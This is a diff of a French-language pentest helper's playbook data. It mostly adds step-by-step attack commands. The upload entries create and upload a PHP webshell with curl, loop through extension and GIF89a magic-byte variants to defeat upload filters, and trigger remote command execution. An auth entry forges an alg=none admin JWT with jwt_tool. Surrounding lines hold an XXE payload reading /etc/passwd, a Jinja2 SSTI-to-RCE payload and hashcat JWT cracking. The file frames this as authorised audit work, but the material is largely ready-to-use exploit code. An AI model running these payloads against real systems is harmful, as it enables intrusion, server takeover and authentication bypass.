@@ -303,9 +303,9 @@ ssrf:[
  {t:"Contourner les filtres", c:`# variantes : http://127.1  /  http://[::1]  /  decimal  /  redirect\ncurl -s "${U}/?${P}=http://0x7f000001/"`, e:`Beaucoup de filtres SSRF sont contournables par encodage/redirection.`}
 ],
 upload:[
- {t:"Uploader un webshell", c:`# fichier shell.php : <?php system($_GET['c']); ?>\n# tenter extensions : .php .php5 .phtml .pht .phar`, e:`Si l'appli n'y filtre que ".php" → une variante passe souvent.`},
- {t:"Contourner le contrôle", c:`# Content-Type: image/png + magic bytes GIF89a; double extension shell.php.png; .htaccess`, e:`Falsifie type MIME / entête magique. .htaccess pour faire exécuter du .png en PHP.`},
- {t:"Exécuter", c:`curl -s "${U}/uploads/shell.php?c=id"`, e:`uid=… → RCE via upload. Chemin d'upload souvent dans la réponse ou /uploads.`}
+ {t:"Uploader un webshell", c:`# 1) crée le webshell en local\nprintf '%s' '<?php system($_GET["c"]); ?>' > shell.php\n# 2) upload via le formulaire (remplace UPLOAD par l'endpoint, 'file' par le vrai nom du champ) :\ncurl -s -F 'file=@shell.php;type=image/png;filename=shell.php' "${U}/UPLOAD"`, e:`ACTIF, sous mandat. Remplace UPLOAD par l'URL qui reçoit l'envoi et 'file' par le nom réel du champ (vu dans le formulaire). Si ça passe, note le chemin renvoyé dans la réponse. Si bloqué → étape suivante (contournement).`},
+ {t:"Contourner le contrôle (extension / MIME / magic bytes)", c:`# variantes d'extension si .php est filtré :\nfor e in php5 phtml pht phar phtm; do cp shell.php "shell.$e"; curl -s -F "file=@shell.$e;type=image/png" "${U}/UPLOAD"; done\n# double extension + entête d'image GIF (passe les contrôles "c'est une image") :\nprintf '%s' 'GIF89a<?php system($_GET["c"]); ?>' > shell.php.png\ncurl -s -F 'file=@shell.php.png;type=image/png;filename=shell.php.png' "${U}/UPLOAD"`, e:`Falsifie l'extension, le type MIME et l'entête magique GIF89a — une variante passe souvent le filtre. (Si l'upload de .htaccess est permis : règle AddType pour exécuter le .png en PHP.)`},
+ {t:"Exécuter (preuve RCE)", c:`# remplace par le chemin réel renvoyé à l'upload (souvent /uploads/ ou /wp-content/uploads/) :\ncurl -s "${U}/uploads/shell.php?c=id"`, e:`uid=… gid=… dans la réponse → RCE via upload confirmée. Colle la sortie → ▶ Analyser (détecté automatiquement). Chemin d'upload souvent visible dans la réponse de l'étape précédente ou sous /uploads.`}
 ],
 xxe:[
  {t:"Injecter une entité externe", c:`curl -s -X POST ${U}/endpoint -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'`, e:`Si /etc/passwd revient dans la réponse → XXE (lecture de fichiers).`},
@@ -316,9 +316,9 @@ ssti:[
  {t:"SSTI → RCE (Jinja2 ex.)", c:`${U}/?${P}={{cycler.__init__.__globals__.os.popen('id').read()}}`, e:`Selon le moteur, la SSTI mène à l'exécution de commande.`}
 ],
 auth:[
- {t:"JWT — algorithme none", c:`# décoder le JWT, mettre "alg":"none", retirer la signature, rejouer`, e:`Si accepté → contournement d'authentification total.`},
+ {t:"JWT — algorithme none", c:`# jwt_tool est préinstallé sur Kali — forge un token alg=none role=admin :\njwt_tool TON_JWT -X a -I -pc role -pv admin\n# rejoue le token forgé affiché ci-dessus :\ncurl -s -H "Authorization: Bearer TOKEN_FORGE" "${U}/api/me"`, e:`Remplace TON_JWT par ton token (cookie / en-tête Authorization) puis TOKEN_FORGE par celui que jwt_tool renvoie. Si l'API répond en admin sans signature valide → contournement d'authentification total (critique). Colle la réponse → ▶ Analyser.`},
  {t:"JWT — secret faible", c:`hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt`, e:`Si le secret HS256 est faible → tu forges n'importe quel token (ex: admin).`},
- {t:"Reset / session", c:`# tester : token de reset prévisible, non expiré, réutilisable ; session non invalidée au logout`, e:`Failles logiques d'auth = souvent bien payées et sûres à tester.`}
+ {t:"Reset / session", c:`# 1) le cookie de session est-il bien invalidé au logout ? (rejoue une page privée APRÈS déconnexion)\ncurl -s -o /dev/null -w "après logout: %{http_code}\\n" -b "ANCIEN_COOKIE" "${U}/wp-admin/profile.php"\n# 2) le lien de reset reste-t-il valide après usage / expiration ? rejoue l'URL reçue\ncurl -s -o /dev/null -w "reset rejoué: %{http_code}\\n" "${U}/LIEN-RESET-DEJA-UTILISE"`, e:`Si la page privée répond 200 avec l'ancien cookie après déconnexion → session non invalidée. Si le lien de reset remarche après usage/délai → token réutilisable. Deux failles logiques d'auth à mettre au rapport. Colle la sortie → ▶ Analyser.`}
 ],
 leak:[
  {t:"Fuites sur un EMAIL du client (sous mandat)", c:`curl -s -H "hibp-api-key: TA_CLE_HIBP" -A "AllianceGroupe-Audit" "https://haveibeenpwned.com/api/v3/breachedaccount/EMAIL_DU_CLIENT?truncateResponse=false"`, e:`Liste les fuites où l'email apparaît (nom, date, données exposées). <b>Email/domaine du CLIENT sous mandat uniquement — jamais un tiers.</b> Colle la sortie JSON puis Analyser.`},
